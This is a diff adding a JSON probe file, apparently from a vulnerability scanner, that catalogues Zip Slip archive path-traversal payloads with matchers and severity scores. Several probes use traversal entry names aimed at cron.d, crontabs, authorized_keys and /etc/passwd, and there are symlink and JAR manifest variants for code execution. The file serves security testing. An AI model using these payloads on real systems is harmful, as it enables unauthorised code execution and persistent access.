@@ -1,0 +1,156 @@
+{
+  "category": "zip_slip",
+  "description": "Archive-extraction path traversal (Snyk 2018 — Zip Slip). Triggers when application unpacks attacker-controlled zip/tar/7z/rar/jar without canonicalising entry names — `../../../etc/cron.d/x` lands outside intended directory. Reference-only: requires upload-then-trigger sequence + post-extraction filesystem observation; operator drives via file_upload tool. Maps to OWASP WSTG 4.10.8 + PayloadsAllTheThings 'Insecure File Upload'.",
+  "contexts": {
+    "zip_traversal_classic": {
+      "description": "Standard Zip Slip: zip entry name contains relative path. Affects Java (ZipInputStream pre-Java7u131), Python (zipfile pre-3.6.2 PR), Node (unzipper/adm-zip <0.5.0), Go (archive/zip pre-1.18), PHP (ZipArchive default).",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Entry name: ../../../../../../tmp/swk-zipslip-{{marker}}",
+          "description": "Build a zip with one harmless file but its entry name escapes the target dir. After upload + extract, check /tmp/swk-zipslip-{{marker}} exists OR app behaves as if file landed elsewhere.",
+          "matchers": [
+            {"type": "literal", "pattern": "swk-zipslip"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "Entry name: ..\\..\\..\\..\\Windows\\Temp\\swk-{{marker}}.txt",
+          "description": "Windows backslash variant — same idea, different path separator. Affects implementations that only filter forward slashes.",
+          "matchers": [
+            {"type": "literal", "pattern": "swk-"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "zip_overwrite_critical_files": {
+      "description": "Maximum-impact variant — overwrite app config / cron / startup scripts. Picks paths attacker can reasonably guess and that grant code execution on next service restart or cron tick.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Entry name: ../../etc/cron.d/swk-{{marker}}",
+          "description": "Drop a cron job — when cron service triggers, attacker payload runs as root",
+          "matchers": [
+            {"type": "literal", "pattern": "cron"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        },
+        {
+          "payload": "Entry name: ../../var/spool/cron/crontabs/www-data",
+          "description": "Per-user crontab overwrite — works if app runs as www-data and has write access to its own crontab",
+          "matchers": [
+            {"type": "literal", "pattern": "crontabs"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "Entry name: ../../../home/<user>/.ssh/authorized_keys",
+          "description": "Drop SSH key into a known service account — persistent RCE",
+          "matchers": [
+            {"type": "literal", "pattern": ".ssh"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        }
+      ]
+    },
+    "tar_extraction_traversal": {
+      "description": "Tar/Tar.gz variant: same idea but the tar archive format has its own name encoding. Some libraries pass strings to filesystem with no normalisation.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Tar entry: ../../../../etc/passwd-swk-{{marker}}",
+          "description": "Tar extraction with traversal name — Python tarfile pre-3.12 default is unsafe",
+          "matchers": [
+            {"type": "literal", "pattern": "passwd-swk"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "rar_seven_z_traversal": {
+      "description": "RAR / 7z extraction variants. unrar (libarchive), 7-Zip CLI, p7zip-full — each has had CVE for traversal in entry name.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "7z entry: ../../../../tmp/swk-7z-{{marker}}.txt",
+          "description": "7z archive with traversal entry — affects p7zip pre-22.00 + .NET SharpCompress pre-0.30.0",
+          "matchers": [
+            {"type": "literal", "pattern": "swk-7z"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "symlink_in_archive": {
+      "description": "Archive contains a symlink pointing outside extraction directory + a regular file at the symlink's name. Two-stage attack: first extract creates symlink, second extract writes through symlink to attacker-controlled path. Affects libraries that don't follow --no-symlinks default.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Symlink entry: 'link' -> /etc/cron.d/swk-{{marker}}; File entry: 'link' -> <payload>",
+          "description": "Two-entry exploit: symlink first, file second. On extract, second entry overwrites cron.d via symlink.",
+          "matchers": [
+            {"type": "literal", "pattern": "symlink"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    },
+    "jar_zip_polyglot": {
+      "description": "Many Java apps re-extract uploaded .jar files for plugin/extension hot-load. Zip Slip in a .jar with `Class-Path` manifest pointing at a sibling .jar can pull-in attacker code.",
+      "tech_match": ["java", "tomcat", "jetty", "weblogic"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "JAR with manifest: Class-Path: ../../webapps/ROOT/swk-{{marker}}.jar",
+          "description": "Plugin/extension loader pulls referenced jar in turn",
+          "matchers": [
+            {"type": "literal", "pattern": "Class-Path"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "post_extract_observability": {
+      "description": "Detection strategy when filesystem observation isn't possible (typical bug-bounty target). Indicators of successful extraction-traversal.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "",
+          "description": "(1) App responds with file-not-found before any other behavior — extraction happened. (2) Service starts behaving differently after extraction — file landed in classpath / autoload dir. (3) Subsequent request to attacker-guessed path returns the planted content.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "literal", "pattern": "swk-zipslip"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
